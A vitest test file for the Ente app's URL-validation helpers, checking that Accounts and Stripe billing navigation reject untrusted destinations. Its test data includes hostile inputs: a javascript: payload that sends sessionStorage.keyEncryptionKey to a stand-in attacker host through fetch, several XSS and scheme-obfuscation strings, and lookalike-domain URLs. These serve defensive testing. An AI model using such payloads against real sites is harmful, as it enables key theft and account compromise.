import {
    accountsNavigationURL,
    trustedNavigationURL,
} from "ente-base/safe-navigation";
import { afterEach, expect, test, vi } from "vitest";

const env = vi.hoisted(() => ({
    buildEnvAccountsOrigin: undefined as string | undefined,
    isDevBuild: false,
}));
vi.mock("ente-base/env", () => env);

afterEach(() => {
    env.buildEnvAccountsOrigin = undefined;
    env.isDevBuild = false;
});

test.each([
    "javascript:fetch('https://evil.example/?k='+sessionStorage.keyEncryptionKey)//",
    "JaVaScRiPt:alert(1)//",
    "\njavascript:alert(1)//",
    "java\tscript:alert(1)//",
    "data:text/html,<script>alert(1)</script>",
    "http://accounts.ente.com/passkeys",
    "https://accounts.ente.com.evil.example/passkeys",
    "https://accounts.ente.com@evil.example/passkeys",
    "https://evil.example@accounts.ente.com/passkeys",
    "https://accounts.ente.com:444/passkeys",
    "https://evil.example/passkeys",
    "//accounts.ente.com/passkeys",
    "/passkeys",
    "http://localhost:3001/passkeys",
])("rejects an untrusted Accounts destination: %s", (value) => {
    expect(() => accountsNavigationURL(value)).toThrow();
});

test.each(["https://accounts.ente.com", "https://accounts.ente.io"])(
    "accepts the hosted Accounts origin %s",
    (origin) => {
        expect(
            accountsNavigationURL(`${origin}/passkeys?token=test`).href,
        ).toBe(`${origin}/passkeys?token=test`);
    },
);

test("a self-hosted build trusts only its configured Accounts origin", () => {
    env.buildEnvAccountsOrigin = "https://accounts.example.org";
    expect(
        accountsNavigationURL("https://accounts.example.org/passkeys").origin,
    ).toBe("https://accounts.example.org");
    expect(() => accountsNavigationURL("https://accounts.ente.com")).toThrow();
});

test("local HTTP needs both an explicit origin and a development build", () => {
    env.buildEnvAccountsOrigin = "http://localhost:3001";
    expect(() => accountsNavigationURL("http://localhost:3001")).toThrow();
    env.isDevBuild = true;
    expect(accountsNavigationURL("http://localhost:3001/passkeys").origin).toBe(
        "http://localhost:3001",
    );
    expect(() => accountsNavigationURL("http://localhost:3002")).toThrow();
    env.buildEnvAccountsOrigin = "http://accounts.example.org";
    expect(() =>
        accountsNavigationURL("http://accounts.example.org"),
    ).toThrow();
});

test("billing portal validation preserves Stripe sessions and rejects other origins", () => {
    const origins = ["https://billing.stripe.com"];
    const portal = "https://billing.stripe.com/p/session/test?locale=en";
    expect(trustedNavigationURL(portal, origins).href).toBe(portal);
    for (const value of [
        "javascript:alert(1)",
        "http://billing.stripe.com/p/session/test",
        "https://billing.stripe.com.evil.example/p/session/test",
        "https://evil.example/p/session/test",
    ]) {
        expect(() => trustedNavigationURL(value, origins)).toThrow();
    }
});
